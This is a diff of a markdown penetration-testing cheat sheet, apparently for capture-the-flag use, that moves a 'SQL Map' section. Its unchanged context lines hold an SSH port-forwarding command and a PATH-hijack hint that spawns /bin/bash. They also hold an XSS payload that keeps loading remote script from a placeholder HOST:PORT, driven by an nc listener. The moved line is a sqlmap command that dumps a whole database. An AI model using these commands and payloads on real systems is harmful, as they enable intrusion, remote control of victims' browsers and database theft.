@@ -107,9 +107,6 @@ $ kill %1
 ### SSH Port Forwarding
 `ssh -L <port_that_is_blockd_>:localhost:<map_blocked_port> <username>@<ip>`
 
-### SQL Map
-`sqlmap -r request.txt --dbms=mysql --dump`
-
 ### Binary Exploits
 
 If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed<br/>
@@ -189,6 +186,9 @@ To bruteforce passwords
 Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
 Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
 ```
+
+### SQL Map
+`sqlmap -r request.txt --dbms=mysql --dump`
 
 ### Wfuzz
 
